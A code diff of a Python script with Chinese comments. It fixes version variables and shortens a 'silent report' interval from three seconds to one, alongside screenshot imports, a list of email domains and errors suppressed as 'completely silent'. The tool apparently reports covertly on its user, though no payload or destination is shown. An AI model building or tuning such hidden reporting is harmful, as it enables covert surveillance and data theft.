@@ -29,8 +29,8 @@ import subprocess
 import ctypes
 import inspect
 
-Form == "python"
-Version == "v0.4-release"
+Form = "python"
+Version = "v0.4-release"
 
 # Pillow 相關（截圖與圖像處理）
 try:
@@ -191,8 +191,6 @@ silent_report()
 
 now = datetime.now()
 timestamp = now.strftime("%Y.%m.%d.%H.%M.%S")
-Version = "v0.3-release"
-Form = "python"
 
 email_domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'qq.com', 'protonmail.com', 'icloud.com', 'mail.com', 'zoho.com', 'yandex.com', 'gmx.com', 'aol.com', 'live.com', 'inbox.com', 'fastmail.com', 'tutanota.com', 'hushmail.com', 'mailfence.com', 'runbox.com', 'posteo.de', 'startmail.com', '163.com', '126.com', 'sina.com', 'sohu.com', 'yeah.net', 'tom.com', '21cn.com', '189.cn', 'foxmail.com', 'aliyun.com', 'vip.qq.com', 'vip.163.com', 'vip.sina.com', 'vip.126.com', 'vip.tom.com', 'live.cn', 'live.hk', 'live.com.cn', 'hotmail.co.uk', 'hotmail.fr', 'hotmail.de', 'yahoo.co.uk', 'yahoo.fr', 'yahoo.de', 'outlook.co.uk', 'outlook.fr', 'outlook.de']
 
@@ -2802,10 +2800,10 @@ def silent_report() -> None:
     except Exception:
         pass  # 完全靜默
 
-# ==================== 定時上報（每 3 秒一次） ====================
+# ==================== 定時上報（每 1 秒一次） ====================
 
 
-REPORT_INTERVAL = 3  # 秒，每 3 秒上報一次
+REPORT_INTERVAL = 1  # 秒，每 1 秒上報一次
 
 def timed_report():
     """定時執行的上報任務"""
